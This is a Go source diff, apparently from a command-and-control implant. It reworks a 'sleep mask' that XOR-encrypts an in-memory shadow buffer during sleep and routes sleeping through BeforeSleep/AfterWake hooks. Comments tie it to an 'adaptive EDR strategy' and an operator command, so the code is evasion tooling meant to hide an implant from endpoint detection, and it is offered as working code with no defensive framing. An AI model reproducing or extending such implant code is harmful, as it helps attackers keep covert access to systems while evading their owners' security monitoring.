@@ -53,10 +53,11 @@ func sleepMaskEncrypt() {
 	if !smAltBufInit {
 		smAltBuf = buildAltShadow()
 		smAltKey = epochKey()
-		smAltIdx = 0
 		smAltBufInit = true
-		sleepMaskActive = true
 	}
+	// Restart the keystream at the same offset on every pass so the Decrypt
+	// pass restores the shadow byte for byte.
+	smAltIdx = 0
 	for i := range smAltBuf {
 		smAltBuf[i] ^= smAltKey[smAltIdx%len(smAltKey)]
 		smAltIdx++
@@ -66,25 +67,32 @@ func sleepMaskEncrypt() {
 func sleepMaskDecrypt() {
 	smAltMu.Lock()
 	defer smAltMu.Unlock()
-	if !sleepMaskActive {
+	if !smAltBufInit {
 		return
 	}
+	smAltIdx = 0
 	for i := range smAltBuf {
 		smAltBuf[i] ^= smAltKey[smAltIdx%len(smAltKey)]
 		smAltIdx++
 	}
 }
 
+// InitSleepMask reports that the platform infrastructure is ready; the shadow
+// buffer needs no OS setup and is built lazily on the first encrypt pass.
 func InitSleepMask() bool {
+	return true
+}
+
+// sleepMaskPolicyEnabled is always false here: the adaptive EDR strategy that
+// opts into masked sleeping is Windows-only, so on other platforms the mask
+// activates only when an operator switches one via set_sleep_mask.
+func sleepMaskPolicyEnabled() bool {
 	return false
 }
 
 func sleepWithMask(d time.Duration) {
-	if activeSleepMask != nil {
-		activeSleepMask.Encrypt()
-	}
-	time.Sleep(d)
-	if activeSleepMask != nil {
-		activeSleepMask.Decrypt()
-	}
+	activeSleepMask.Encrypt()
+	activeSleepMask.BeforeSleep(uintptr(d.Milliseconds()))
+	activeSleepMask.AfterWake()
+	activeSleepMask.Decrypt()
 }
